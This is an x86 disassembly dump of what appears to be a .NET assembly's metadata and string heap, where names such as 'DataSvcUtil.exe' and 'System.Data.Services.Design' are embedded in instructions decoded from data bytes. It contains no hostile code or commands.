  4073b9:	add    BYTE PTR [eax+0x4],cl
  4073bc:	dec    ecx
  4073bd:	add    BYTE PTR [eax],al
  4073bf:	add    BYTE PTR [esp+eax*1+0x4d],dl
  4073c3:	add    BYTE PTR [eax],al
  4073c5:	add    BYTE PTR [edi+0x4],bl
  4073c8:	dec    ebp
  4073c9:	add    BYTE PTR [eax],al
  4073cb:	add    BYTE PTR [esp+eax*1+0x4d],ch
  4073cf:	add    BYTE PTR [eax],al
  4073d1:	add    BYTE PTR [ebp+0x4904],al
  4073d7:	add    dh,al
  4073d9:	add    eax,0x4d
  4073de:	iret   
  4073df:	add    eax,0xbd
  4073e4:	mov    ebx,0xc204
  4073e9:	add    al,bl
  4073eb:	add    eax,0xc7
  4073f0:	push   esp
  4073f1:	add    al,0x4d
  4073f3:	add    BYTE PTR [eax],al
  4073f5:	add    BYTE PTR [ecx],bh
  4073f7:	add    al,0x49
  4073f9:	add    BYTE PTR [eax],al
  4073fb:	add    BYTE PTR [esi],bh
  4073fd:	add    al,0x49
  4073ff:	add    BYTE PTR [eax],al
  407401:	add    BYTE PTR [edi+0x4],bl
  407404:	dec    ebp
  407405:	add    BYTE PTR [eax],al
  407407:	add    ch,ah
  407409:	add    eax,0xcc
  40740e:	test   DWORD PTR [ecx+ecx*2],eax
  407411:	add    BYTE PTR [eax],al
  407413:	add    BYTE PTR [eax+0x4],cl
  407416:	dec    ecx
  407417:	add    BYTE PTR [eax],al
  407419:	add    dh,al
  40741b:	add    eax,0x4d
  407420:	gs pop es
  407422:	push   edx
  407423:	add    DWORD PTR [eax],eax
  407425:	add    BYTE PTR [eax+0x7],bh
  407428:	dec    ebp
  407429:	add    BYTE PTR [eax],al
  40742b:	add    BYTE PTR [ebp+0x7],bh
  40742e:	dec    ebp
  40742f:	add    BYTE PTR [eax],al
  407431:	add    BYTE PTR [edi+0x17507],bh
  407437:	add    bh,al
  407439:	pop    es
  40743a:	jns    0x40743d
  40743c:	add    BYTE PTR [eax],al
  40743e:	dec    eax
  40743f:	add    al,0x49
  407441:	add    BYTE PTR [eax],al
  407443:	add    BYTE PTR [eax+ecx*1],dh
  407446:	dec    ebp
  407447:	add    BYTE PTR [eax],al
  407449:	add    BYTE PTR [esi],bh
  40744b:	or     BYTE PTR [ecx+0x0],cl
  40744e:	add    BYTE PTR [eax],al
  407450:	inc    ebp
  407451:	or     BYTE PTR [ebp+0x1],dh
  407454:	add    BYTE PTR [eax],al
  407456:	dec    ebx
  407457:	or     BYTE PTR [edx-0x72ffffff],bl
  40745d:	or     BYTE PTR [ebp+0x1],dh
  407460:	add    BYTE PTR [eax],al
  407462:	cwde   
  407463:	or     BYTE PTR [ebp+0x1],dh
  407466:	add    BYTE PTR [eax],al
  407468:	mov    eax,ds:0x17508
  40746d:	add    BYTE PTR [eax+0x4],cl
  407470:	dec    ecx
  407471:	add    BYTE PTR [eax],al
  407473:	add    bh,bl
  407475:	or     BYTE PTR [ecx+0x0],cl
  407478:	add    BYTE PTR [eax],al
  40747a:	inc    ebp
  40747b:	or     BYTE PTR [ebp+0x1],dh
  40747e:	add    BYTE PTR [eax],al
  407480:	mov    bh,0x9
  407482:	dec    ebp
  407483:	add    BYTE PTR [eax],al
  407485:	add    BYTE PTR [ebx+0x8],cl
  407488:	call   0xa210:0x2b000001
  40748f:	add    eax,DWORD PTR [eax]
  407491:	add    BYTE PTR [eax],dh
  407493:	adc    BYTE PTR [edi+0x33000003],ah
  407499:	adc    BYTE PTR [ecx+0x0],cl
  40749c:	add    BYTE PTR [eax],al
  40749e:	aaa    
  40749f:	adc    BYTE PTR [ebx+eax*1+0x10400000],ch
  4074a6:	mov    cl,0x3
  4074a8:	add    BYTE PTR [eax],al
  4074aa:	dec    eax
  4074ab:	adc    BYTE PTR [ebp+0x0],cl
  4074ae:	add    BYTE PTR [eax],al
  4074b0:	(bad)  
  4074b1:	push   cs
  4074b2:	dec    ecx
  4074b3:	add    BYTE PTR [eax],al
  4074b5:	add    BYTE PTR [ecx+0x13],dh
  4074b8:	enter  0x3,0x0
  4074bc:	mov    BYTE PTR [ebx],dl
  4074be:	enter  0x3,0x0
  4074c2:	pushf  
  4074c3:	adc    ecx,eax
  4074c5:	add    eax,DWORD PTR [eax]
  4074c7:	add    BYTE PTR [ecx+0x3c813],dh
  4074cd:	add    al,cl
  4074cf:	adc    ecx,eax
  4074d1:	add    eax,DWORD PTR [eax]
  4074d3:	add    bh,ah
  4074d5:	adc    ecx,eax
  4074d7:	add    eax,DWORD PTR [eax]
  4074d9:	add    BYTE PTR [esi],al
  4074db:	adc    al,0xc8
  4074dd:	add    eax,DWORD PTR [eax]
  4074df:	add    BYTE PTR [ecx],ah
  4074e1:	adc    al,0xc8
  4074e3:	add    eax,DWORD PTR [eax]
  4074e5:	add    BYTE PTR [eax],bh
  4074e7:	adc    al,0xc8
  4074e9:	add    eax,DWORD PTR [eax]
  4074eb:	add    BYTE PTR [edx+0x14],cl
  4074ee:	enter  0x3,0x0
  4074f2:	pop    ebp
  4074f3:	adc    al,0xc8
  4074f5:	add    eax,DWORD PTR [eax]
  4074f7:	add    BYTE PTR [eax+0x14],bh
  4074fa:	enter  0x3,0x0
  4074fe:	mov    dl,BYTE PTR [eax+ecx*8]
  407501:	add    eax,DWORD PTR [eax]
  407503:	add    BYTE PTR [esp+edx*1+0x3c8],bl
  40750a:	test   eax,0x3c814
  40750f:	add    BYTE PTR [ebp+0x3c814],bh
  407515:	add    cl,dl
  407517:	adc    al,0xc8
  407519:	add    eax,DWORD PTR [eax]
  40751b:	add    BYTE PTR [ecx+0x3c80c],cl
  407521:	add    ch,ah
  407523:	adc    al,0xc8
  407525:	add    eax,DWORD PTR [eax]
  407527:	add    BYTE PTR [ecx],al
  407529:	adc    eax,0x3c8
  40752e:	pop    ds
  40752f:	adc    eax,0x3c8
  407534:	cmp    eax,0x3c815
  407539:	add    ch,ch
  40753b:	or     eax,0x3c8
  407540:	or     al,0xe
  407542:	enter  0x3,0x0
  407546:	sahf   
  407547:	adc    eax,0x3e3
  40754c:	dec    eax
  40754d:	add    al,0x49
  40754f:	add    BYTE PTR [eax],al
  407551:	add    BYTE PTR [ecx+0x22e1d1a],cl
  407557:	add    BYTE PTR ds:0x2000300,al
  40755d:	add    BYTE PTR [esi],al
  40755f:	add    BYTE PTR ds:0x7000200,al
  407565:	add    BYTE PTR [edi],al
  407567:	add    BYTE PTR [edx],al
  407569:	add    BYTE PTR [eax],cl
  40756b:	add    BYTE PTR [ecx],cl
  40756d:	add    BYTE PTR [edx],al
  40756f:	add    BYTE PTR [ecx],cl
  407571:	add    BYTE PTR [ebx],cl
  407573:	add    BYTE PTR [edx],al
  407575:	add    BYTE PTR [edx],cl
  407577:	add    BYTE PTR ds:0xb000200,cl
  40757d:	add    BYTE PTR [edi],cl
  40757f:	add    BYTE PTR [edx],al
  407581:	add    BYTE PTR ds:0x2001100,cl
  407587:	add    BYTE PTR [ebx],dl
  407589:	add    BYTE PTR [ebx],dl
  40758b:	add    BYTE PTR [edx],al
  40758d:	add    BYTE PTR [eax+eax*1],dl
  407590:	adc    eax,0x15000200
  407595:	add    BYTE PTR [edi],dl
  407597:	add    BYTE PTR [edx],al
  407599:	add    BYTE PTR [esi],dl
  40759b:	add    BYTE PTR [ecx],bl
  40759d:	add    BYTE PTR [edx],al
  40759f:	add    BYTE PTR [edi],dl
  4075a1:	add    BYTE PTR [ebx],bl
  4075a3:	add    BYTE PTR [edx],al
  4075a5:	add    BYTE PTR [eax],bl
  4075a7:	add    BYTE PTR ds:0x19000200,bl
  4075ad:	add    BYTE PTR [edi],bl
  4075af:	add    BYTE PTR [edx],al
  4075b1:	add    BYTE PTR [edx],bl
  4075b3:	add    BYTE PTR [ecx],ah
  4075b5:	add    BYTE PTR [edx],al
  4075b7:	add    BYTE PTR [ebx],bl
  4075b9:	add    BYTE PTR [ebx],ah
  4075bb:	add    BYTE PTR [edx],al
  4075bd:	add    BYTE PTR [eax+eax*1],bl
  4075c0:	and    eax,0x20000200
  4075c5:	add    BYTE PTR [edi],ah
  4075c7:	add    BYTE PTR [edx],al
  4075c9:	add    BYTE PTR [edi],ah
  4075cb:	add    BYTE PTR [ecx],ch
  4075cd:	add    BYTE PTR [edx],al
  4075cf:	add    BYTE PTR [eax],ch
  4075d1:	add    BYTE PTR [ebx],ch
  4075d3:	add    BYTE PTR [ecx],al
  4075d5:	add    BYTE PTR [ecx],ch
  4075d7:	add    BYTE PTR [ebx],ch
  4075d9:	add    BYTE PTR [ecx],al
  4075db:	add    BYTE PTR [ebx],ch
  4075dd:	add    BYTE PTR ds:0x2a000200,ch
  4075e3:	add    BYTE PTR ds:0x37000200,ch
  4075e9:	add    BYTE PTR [edi],ch
  4075eb:	add    BYTE PTR [edx],al
  4075ed:	add    BYTE PTR [eax],bh
  4075ef:	add    BYTE PTR [ecx],dh
  4075f1:	add    BYTE PTR [edx],al
  4075f3:	add    BYTE PTR [ecx],bh
  4075f5:	add    BYTE PTR [ebx],dh
  4075f7:	add    BYTE PTR [edx],al
  4075f9:	add    BYTE PTR [eax+eax*1],bh
  4075fc:	xor    eax,0x3d000200
  407601:	add    BYTE PTR [edi],dh
  407603:	add    BYTE PTR [edx],al
  407605:	add    BYTE PTR [esi],bh
  407607:	add    BYTE PTR [ecx],bh
  407609:	add    BYTE PTR [edx],al
  40760b:	add    BYTE PTR [edi],bh
  40760d:	add    BYTE PTR [ebx],bh
  40760f:	add    BYTE PTR [edx],al
  407611:	add    BYTE PTR [edx+0x0],al
  407614:	cmp    eax,0x43000200
  407619:	add    BYTE PTR [edi],bh
  40761b:	add    BYTE PTR [edx],al
  40761d:	add    BYTE PTR [eax+eax*1+0x41],al
  407621:	add    BYTE PTR [edx],al
  407623:	add    BYTE PTR [esi+0x0],al
  407626:	inc    ebx
  407627:	add    BYTE PTR [edx],al
  407629:	add    BYTE PTR [edi+0x0],al
  40762c:	inc    ebp
  40762d:	add    BYTE PTR [edx],al
  40762f:	add    BYTE PTR [ebp+0x0],cl
  407632:	inc    edi
  407633:	add    BYTE PTR [edx],al
  407635:	add    BYTE PTR [esi+0x0],cl
  407638:	dec    ecx
  407639:	add    BYTE PTR [edx],al
  40763b:	add    BYTE PTR [edx+0x0],dl
  40763e:	dec    ebx
  40763f:	add    BYTE PTR [edx],al
  407641:	add    BYTE PTR [eax+0x0],ch
  407644:	dec    ebp
  407645:	add    BYTE PTR [edx],al
  407647:	add    BYTE PTR [ecx+0x0],ch
  40764a:	dec    edi
  40764b:	add    BYTE PTR [ecx],al
  40764d:	add    BYTE PTR [ebx+0x0],ch
  407650:	push   ecx
  407651:	add    BYTE PTR [edx],al
  407653:	add    BYTE PTR [edx+0x0],ch
  407656:	push   ecx
  407657:	add    BYTE PTR [ecx],al
  407659:	add    BYTE PTR [ebp+0x0],ch
  40765c:	push   ebx
  40765d:	add    BYTE PTR [edx],al
  40765f:	add    BYTE PTR [eax+eax*1+0x53],ch
  407663:	add    BYTE PTR [edx],al
  407665:	add    BYTE PTR [esi+0x0],ch
  407668:	push   ebp
  407669:	add    BYTE PTR [ecx],al
  40766b:	add    BYTE PTR [edi+0x0],ch
  40766e:	push   ebp
  40766f:	add    BYTE PTR [ecx],al
  407671:	add    BYTE PTR [ecx+0x0],dh
  407674:	push   edi
  407675:	add    BYTE PTR [edx],al
  407677:	add    BYTE PTR [eax+0x0],dh
  40767a:	push   edi
  40767b:	add    BYTE PTR [edx],al
  40767d:	add    BYTE PTR [edx+0x0],dh
  407680:	pop    ecx
  407681:	add    BYTE PTR [ecx],al
  407683:	add    BYTE PTR [ebx+0x0],dh
  407686:	pop    ecx
  407687:	add    BYTE PTR [edx],al
  407689:	add    BYTE PTR [eax+eax*1+0x5b],bh
  40768d:	add    BYTE PTR [edx],al
  40768f:	add    BYTE PTR [ecx+0x2005d00],al
  407695:	add    BYTE PTR [edx+0x2005f00],al
  40769b:	add    BYTE PTR [ebx+0x2006100],al
  4076a1:	add    BYTE PTR [eax+eax*1+0x20063],al
  4076a8:	test   DWORD PTR [eax],eax
  4076aa:	add    BYTE PTR gs:[edx],al
  4076ad:	add    BYTE PTR [esi+0x2006700],al
  4076b3:	add    BYTE PTR [edi+0x2006900],al
  4076b9:	add    BYTE PTR [eax+0x2006b00],cl
  4076bf:	add    BYTE PTR [ecx+0x2006d00],cl
  4076c5:	add    BYTE PTR [edx+0x2006f00],cl
  4076cb:	add    BYTE PTR [ebx+0x2007100],cl
  4076d1:	add    BYTE PTR [eax+eax*1+0x20073],cl
  4076d8:	lea    eax,[eax]
  4076da:	jne    0x4076dc
  4076dc:	add    al,BYTE PTR [eax]
  4076de:	pop    DWORD PTR [eax]
  4076e0:	ja     0x4076e2
  4076e2:	add    al,BYTE PTR [eax]
  4076e4:	xchg   ecx,eax
  4076e5:	add    BYTE PTR [ecx+0x0],bh
  4076e8:	add    al,BYTE PTR [eax]
  4076ea:	xchg   ebx,eax
  4076eb:	add    BYTE PTR [ebx+0x0],bh
  4076ee:	add    al,BYTE PTR [eax]
  4076f0:	xchg   esp,eax
  4076f1:	add    BYTE PTR [ebp+0x0],bh
  4076f4:	add    al,BYTE PTR [eax]
  4076f6:	sahf   
  4076f7:	add    BYTE PTR [edi+0x0],bh
  4076fa:	add    al,BYTE PTR [eax]
  4076fc:	lahf   
  4076fd:	add    BYTE PTR [ecx-0x5ffffe00],al
  407703:	add    BYTE PTR [ebx-0x5efffe00],al
  407709:	add    BYTE PTR [ebp-0x5bfffe00],al
  40770f:	add    BYTE PTR [edi-0x5afffe00],al
  407715:	add    BYTE PTR [ecx-0x54fffe00],cl
  40771b:	add    BYTE PTR [ebx-0x52fffe00],cl
  407721:	add    BYTE PTR [ebp-0x4dfffe00],cl
  407727:	add    BYTE PTR [edi-0x5dfff400],cl
  40772d:	add    BYTE PTR [ebx],al
  40772f:	add    BYTE PTR [edx],cl
  407731:	add    BYTE PTR [eax],dl
  407733:	add    BYTE PTR [eax+0x2e],ah
  407736:	fild   QWORD PTR [esi]
  407738:	out    0x2e,eax
  40773a:	sti    
  40773b:	adc    BYTE PTR cs:[edi],ch
  40773e:	aas    
  40773f:	das    
  407740:	push   ebx
  407741:	das    
  407742:	call   0x706a76
  407747:	xor    BYTE PTR [esi],dl
  407749:	xor    BYTE PTR [edx],ah
  40774b:	xor    BYTE PTR [eax+esi*1],dh
  40774e:	inc    edx
  40774f:	xor    DWORD PTR [esi+0x31],esp
  407752:	nop
  407753:	xor    DWORD PTR [edi+0x1331a531],ebx
  407759:	xor    dl,BYTE PTR [ecx+0x432a132]
  40775f:	add    BYTE PTR [eax],0x0
  407762:	add    eax,DWORD PTR [eax]
  407764:	add    eax,0x0
  407769:	add    BYTE PTR [ecx],al
  40776b:	add    BYTE PTR [eax],al
  40776d:	add    BYTE PTR [ecx],ch
  40776f:	repz add DWORD PTR cs:[eax],eax
  407773:	add    BYTE PTR [edx],al
	...
  40777d:	add    BYTE PTR [eax],al
  40777f:	add    BYTE PTR [ecx],al
  407781:	add    BYTE PTR [edx+eax*1+0x0],cl
  407788:	add    al,BYTE PTR [eax]
	...
  407792:	add    BYTE PTR [eax],al
  407794:	add    DWORD PTR [eax],eax
  407796:	xchg   ebp,eax
  407797:	add    al,BYTE PTR [eax]
  407799:	add    BYTE PTR [eax],al
  40779b:	add    BYTE PTR [ebx],al
  40779d:	add    BYTE PTR ds:0x0,al
  4077a3:	add    BYTE PTR [eax],al
  4077a5:	add    BYTE PTR [eax],al
  4077a7:	add    BYTE PTR [ecx],al
  4077a9:	add    BYTE PTR [edi+0x8],dh
  4077af:	add    BYTE PTR [ebx],al
  4077b1:	add    BYTE PTR ds:0x0,al
  4077b7:	add    BYTE PTR [eax],al
  4077b9:	add    BYTE PTR [eax],al
  4077bb:	add    BYTE PTR [ecx],al
  4077bd:	add    BYTE PTR [esi],cl
  4077bf:	add    DWORD PTR [eax],eax
  4077c1:	add    BYTE PTR [eax],al
  4077c3:	add    BYTE PTR [ebx],al
  4077c5:	add    BYTE PTR ds:0x0,al
  4077cb:	add    BYTE PTR [eax],al
  4077cd:	add    BYTE PTR [eax],al
  4077cf:	add    BYTE PTR [ecx],al
  4077d1:	add    dl,dl
  4077d3:	or     al,BYTE PTR [eax]
  4077d5:	add    BYTE PTR [eax],al
  4077d7:	add    BYTE PTR [edx],al
	...
  4077e1:	add    BYTE PTR [eax],al
  4077e3:	add    BYTE PTR [ecx],al
  4077e5:	add    BYTE PTR [ebx+0x24],dl
  4077e8:	add    BYTE PTR [eax],al
  4077ea:	add    BYTE PTR [eax],al
  4077ec:	add    eax,DWORD PTR [eax]
  4077ee:	add    eax,0x0
  4077f3:	add    BYTE PTR [eax],al
  4077f5:	add    BYTE PTR [eax],al
  4077f7:	add    BYTE PTR [ecx],al
  4077f9:	add    ah,ch
  4077fb:	and    eax,0x0
  407800:	add    al,BYTE PTR [eax]
	...
  40780a:	add    BYTE PTR [eax],al
  40780c:	and    eax,0x262a33
  407811:	add    BYTE PTR [eax],al
  407813:	add    BYTE PTR [eax],al
  407815:	add    BYTE PTR [eax],al
  407817:	add    BYTE PTR [ecx],al
  407819:	add    BYTE PTR [eax],al
  40781b:	add    BYTE PTR [edx+0x27],dl
  40781e:	add    BYTE PTR [eax],al
  407820:	or     BYTE PTR [eax],al
  407822:	pop    es
  407823:	add    BYTE PTR [esi],cl
  407825:	add    BYTE PTR ds:0xc900e900,cl
  40782b:	xor    ebx,ebp
  40782d:	add    cl,cl
  40782f:	xor    ecx,esi
  407831:	add    cl,cl
  407833:	xor    DWORD PTR [ebx+0x35dd01],eax
  407839:	add    BYTE PTR [eax],al
  40783b:	add    BYTE PTR [eax],al
  40783d:	cmp    al,0x4d
  40783f:	outs   dx,DWORD PTR ds:[esi]
  407840:	fs jne 0x4078af
  407843:	gs add BYTE PTR ds:[ecx+eiz*2+0x74],al
  407849:	popa   
  40784a:	push   ebx
  40784b:	jbe    0x4078b0
  40784d:	push   ebp
  40784e:	je     0x4078b9
  407850:	ins    BYTE PTR es:[edi],dx
  407851:	cs gs js 0x4078ba
  407855:	add    BYTE PTR [ecx+0x72],al
  407858:	addr16 jne 0x4078c8
  40785b:	outs   dx,BYTE PTR gs:[esi]
  40785d:	je     0x4078a0
  40785f:	je     0x4078d5
  407861:	jb     0x4078cc
  407863:	bound  esi,QWORD PTR [ebp+0x74]
  407866:	add    BYTE PTR gs:[ebx+0x79],dl
  40786a:	jae    0x4078e0
  40786c:	gs ins DWORD PTR es:[edi],dx
  40786e:	cs inc esp
  407870:	popa   
  407871:	je     0x4078d4
  407873:	cs push ebx
  407875:	gs jb  0x4078ee
  407878:	imul   esp,DWORD PTR [ebx+0x65],0x65442e73
  40787f:	jae    0x4078ea
  407881:	outs   dx,BYTE PTR ds:[si]
  407883:	cs inc esp
  407885:	popa   
  407886:	je     0x4078e9
  407888:	push   ebx
  407889:	jbe    0x4078ee
  40788b:	push   ebp
  40788c:	je     0x4078f7
  40788e:	ins    BYTE PTR es:[edi],dx
  40788f:	cs inc ebx
  407891:	outs   dx,DWORD PTR ds:[esi]
  407892:	ins    DWORD PTR es:[edi],dx
  407893:	ins    DWORD PTR es:[edi],dx
  407894:	popa   
  407895:	outs   dx,BYTE PTR ds:[esi]
  407896:	fs dec esp
  407898:	imul   ebp,DWORD PTR [esi+0x65],0x67724100
  40789f:	jne    0x40790e
  4078a1:	outs   dx,BYTE PTR gs:[esi]
  4078a3:	je     0x4078f5
  4078a5:	jb     0x407916
  4078a7:	jo     0x40790e
  4078a9:	jb     0x40791f
  4078ab:	jns    0x4078ad
  4078ad:	inc    ecx
  4078ae:	jb     0x407917
  4078b0:	jne    0x40791f
  4078b2:	outs   dx,BYTE PTR gs:[esi]
  4078b4:	je     0x407906
  4078b6:	jb     0x407927
  4078b8:	jo     0x40791f
  4078ba:	jb     0x407930
  4078bc:	jns    0x407904
  4078be:	outs   dx,DWORD PTR ds:[esi]
  4078bf:	jb     0x407904
  4078c1:	outs   dx,DWORD PTR ds:[esi]
  4078c2:	ins    BYTE PTR es:[edi],dx
  4078c3:	ins    BYTE PTR es:[edi],dx
  4078c4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4078c9:	outs   dx,BYTE PTR ds:[esi]
  4078ca:	jae    0x4078cc
  4078cc:	inc    ebx
  4078cd:	outs   dx,DWORD PTR ds:[esi]
  4078ce:	ins    DWORD PTR es:[edi],dx
  4078cf:	ins    DWORD PTR es:[edi],dx
  4078d0:	popa   
  4078d1:	outs   dx,BYTE PTR ds:[esi]
  4078d2:	fs dec esp
  4078d4:	imul   ebp,DWORD PTR [esi+0x65],0x75677241
  4078db:	ins    DWORD PTR es:[edi],dx
  4078dc:	outs   dx,BYTE PTR gs:[esi]
  4078de:	je     0x407953
  4078e0:	add    BYTE PTR [ebp+0x6e],al
  4078e3:	jne    0x407952
  4078e5:	inc    ecx
  4078e6:	jb     0x40794f
  4078e8:	jne    0x407957
  4078ea:	outs   dx,BYTE PTR gs:[esi]
  4078ec:	je     0x407932
  4078ee:	gs jae 0x407954
  4078f1:	jb     0x40795c
  4078f3:	jo     0x407969
  4078f5:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4078fc:	imul   esp,DWORD PTR [edx+0x75],0x4c006574
  407903:	imul   ebp,DWORD PTR [esi+0x65],0x70617257
  40790a:	add    BYTE PTR [ebx+0x74],dl
  40790d:	jb     0x407978
  40790f:	outs   dx,BYTE PTR ds:[esi]
  407910:	addr16 push ebx
  407912:	gs ins DWORD PTR es:[di],dx
  407915:	outs   dx,BYTE PTR gs:[esi]
  407917:	je     0x407919
  407919:	push   eax
  40791a:	popa   
  40791b:	jb     0x407990
  40791d:	gs push edx
  40791f:	gs jae 0x407997
  407922:	ins    BYTE PTR es:[edi],dx
  407923:	je     0x407925
  407925:	push   ebp
  407926:	jae    0x407989
  407928:	addr16 gs inc ebp
  40792b:	js     0x40798e
  40792d:	ins    DWORD PTR es:[edi],dx
  40792e:	jo     0x40799c
  407930:	add    BYTE PTR gs:[ebx+0x6c],al
  407934:	popa   
  407935:	jae    0x4079aa
  407937:	inc    edi
  407938:	outs   dx,BYTE PTR gs:[esi]
  40793a:	gs jb  0x40799e
  40793d:	je     0x4079a8
  40793f:	outs   dx,DWORD PTR ds:[esi]
  407940:	outs   dx,BYTE PTR ds:[esi]
  407941:	dec    esp
  407942:	popa   
  407943:	outs   dx,BYTE PTR ds:[esi]
  407944:	addr16 jne 0x4079a8
  407947:	add    BYTE PTR gs:[bp+di+0x79],dl
  40794c:	jae    0x4079c2
  40794e:	gs ins DWORD PTR es:[edi],dx
  407950:	cs inc esp
  407952:	popa   
  407953:	je     0x4079b6
  407955:	cs push ebx
  407957:	gs jb  0x4079d0
  40795a:	imul   esp,DWORD PTR [ebx+0x65],0x65442e73
  407961:	jae    0x4079cc
  407963:	outs   dx,BYTE PTR ds:[si]
  407965:	add    BYTE PTR [ecx+ebp*2+0x72],al
  407969:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  40796e:	jns    0x4079b5
  407970:	js     0x4079e2
  407972:	popa   
  407973:	outs   dx,BYTE PTR ds:[esi]
  407974:	imul   ebp,DWORD PTR fs:[esi+0x67],0x656c6946
  40797c:	push   eax
  40797d:	popa   
  40797e:	je     0x4079e8
  407980:	inc    ebx
  407981:	outs   dx,DWORD PTR ds:[esi]
  407982:	ins    BYTE PTR es:[edi],dx
  407983:	ins    BYTE PTR es:[edi],dx
  407984:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407989:	outs   dx,BYTE PTR ds:[esi]
  40798a:	add    BYTE PTR [ebx+0x79],dl
  40798d:	jae    0x407a03
  40798f:	gs ins DWORD PTR es:[edi],dx
  407991:	cs inc esp
  407993:	popa   
  407994:	je     0x4079f7
  407996:	cs push ebx
  407998:	gs jb  0x407a11
  40799b:	imul   esp,DWORD PTR [ebx+0x65],0x65442e73
  4079a2:	jae    0x407a0d
  4079a4:	outs   dx,BYTE PTR ds:[si]
  4079a6:	cs inc esp
  4079a8:	popa   
  4079a9:	je     0x407a0c
  4079ab:	push   ebx
  4079ac:	jbe    0x407a11
  4079ae:	push   ebp
  4079af:	je     0x407a1a
  4079b1:	ins    BYTE PTR es:[edi],dx
  4079b2:	add    BYTE PTR [ebp+0x64],al
  4079b5:	ins    DWORD PTR es:[edi],dx
  4079b6:	inc    edi
  4079b7:	outs   dx,BYTE PTR gs:[esi]
  4079b9:	add    BYTE PTR [edi+0x65],al
  4079bc:	outs   dx,BYTE PTR ds:[esi]
  4079bd:	gs jb  0x407a21
  4079c0:	je     0x407a2b
  4079c2:	outs   dx,DWORD PTR ds:[esi]
  4079c3:	outs   dx,BYTE PTR ds:[esi]
  4079c4:	inc    ebp
  4079c5:	js     0x407a2a
  4079c7:	gs jo  0x407a3e
  4079ca:	imul   ebp,DWORD PTR [edi+0x6e],0x6d644500
  4079d1:	inc    edi
  4079d2:	outs   dx,BYTE PTR gs:[esi]
  4079d4:	inc    ecx
  4079d5:	jo     0x407a47
  4079d7:	ins    BYTE PTR es:[edi],dx
  4079d8:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4079df:	dec    ebp
  4079e0:	outs   dx,DWORD PTR ds:[esi]
  4079e1:	fs add BYTE PTR gs:[ebp+0x64],al
  4079e6:	ins    DWORD PTR es:[edi],dx
  4079e7:	inc    edi
  4079e8:	outs   dx,BYTE PTR gs:[esi]
  4079ea:	inc    ebp
  4079eb:	jb     0x407a5f
  4079ed:	outs   dx,DWORD PTR ds:[esi]
  4079ee:	jb     0x407a33
  4079f0:	outs   dx,DWORD PTR ds:[esi]
  4079f1:	fs add BYTE PTR gs:[ebp+0x64],al
  4079f6:	ins    DWORD PTR es:[edi],dx
  4079f7:	inc    edi
  4079f8:	outs   dx,BYTE PTR gs:[esi]
  4079fa:	inc    ebp
  4079fb:	js     0x407a62
  4079fd:	inc    ebx
  4079fe:	outs   dx,DWORD PTR ds:[esi]
  4079ff:	ins    DWORD PTR es:[edi],dx
  407a00:	ins    DWORD PTR es:[edi],dx
  407a01:	popa   
  407a02:	outs   dx,BYTE PTR ds:[esi]
  407a03:	fs dec esp
  407a05:	imul   ebp,DWORD PTR [esi+0x65],0x75677241
  407a0c:	ins    DWORD PTR es:[edi],dx
  407a0d:	outs   dx,BYTE PTR gs:[esi]
  407a0f:	je     0x407a84
  407a11:	add    BYTE PTR [edi+0x65],al
  407a14:	outs   dx,BYTE PTR ds:[esi]
  407a15:	gs jb  0x407a79
  407a18:	je     0x407a7f
  407a1a:	fs inc ebx
  407a1c:	outs   dx,DWORD PTR ds:[esi]
  407a1d:	fs gs push esi
  407a20:	gs jb  0x407a96
  407a23:	imul   ebp,DWORD PTR [edi+0x6e],0x72745300
  407a2a:	imul   ebp,DWORD PTR [esi+0x67],0x61440073
  407a31:	je     0x407a94
  407a33:	push   ebx
  407a34:	jbe    0x407a99
  407a36:	push   ebp
  407a37:	je     0x407aa2
  407a39:	ins    BYTE PTR es:[edi],dx
  407a3a:	add    BYTE PTR [ebp+0x72],al
  407a3d:	jb     0x407aae
  407a3f:	jb     0x407a41
  407a41:	push   eax
  407a42:	popa   
  407a43:	jb     0x407ab8
  407a45:	gs push eax
  407a47:	popa   
  407a48:	jb     0x407aab
  407a4a:	ins    DWORD PTR es:[edi],dx
  407a4b:	gs je  0x407ab3
  407a4e:	jb     0x407a95
  407a50:	js     0x407ab5
  407a52:	gs jo  0x407ac9
  407a55:	imul   ebp,DWORD PTR [edi+0x6e],0x32584600
  407a5c:	xor    BYTE PTR [ecx+0x73],al
  407a5f:	jae    0x407ac6
  407a61:	ins    DWORD PTR es:[edi],dx
  407a62:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407a66:	inc    esi
  407a67:	pop    eax
  407a68:	xor    esi,DWORD PTR ds:0x65737341
  407a6e:	ins    DWORD PTR es:[edi],dx
  407a6f:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407a73:	inc    esi
  407a74:	pop    eax
  407a75:	inc    ecx
  407a76:	jae    0x407aeb
  407a78:	gs ins DWORD PTR es:[edi],dx
  407a7a:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407a7e:	push   esp
  407a7f:	push   0x73417369
  407a84:	jae    0x407aeb
  407a86:	ins    DWORD PTR es:[edi],dx
  407a87:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407a8b:	inc    ecx
  407a8c:	jae    0x407b01
  407a8e:	gs ins DWORD PTR es:[edi],dx
  407a90:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  407a94:	data16 add BYTE PTR gs:[edx+0x65],dl
  407a99:	jae    0x407adf
  407a9b:	gs jae 0x407b01
  407a9e:	jb     0x407b09
  407aa0:	jo     0x407b16
  407aa2:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407aa9:	imul   esp,DWORD PTR [edx+0x75],0x52006574
  407ab0:	gs jae 0x407af6
  407ab3:	popa   
  407ab4:	je     0x407b1b
  407ab6:	outs   dx,DWORD PTR ds:[si]
  407ab8:	jb     0x407b33
  407aba:	inc    ecx
  407abb:	je     0x407b31
  407abd:	jb     0x407b28
  407abf:	bound  esi,QWORD PTR [ebp+0x74]
  407ac2:	add    BYTE PTR gs:[edx+0x65],dl
  407ac6:	jae    0x407ac8
  407ac8:	ins    DWORD PTR es:[edi],dx
  407ac9:	jae    0x407b2e
  407acb:	outs   dx,DWORD PTR ds:[esi]
  407acc:	jb     0x407b3a
  407ace:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  407ad5:	gs ins DWORD PTR es:[edi],dx
  407ad7:	add    BYTE PTR [ecx+0x74],al
  407ada:	je     0x407b4e
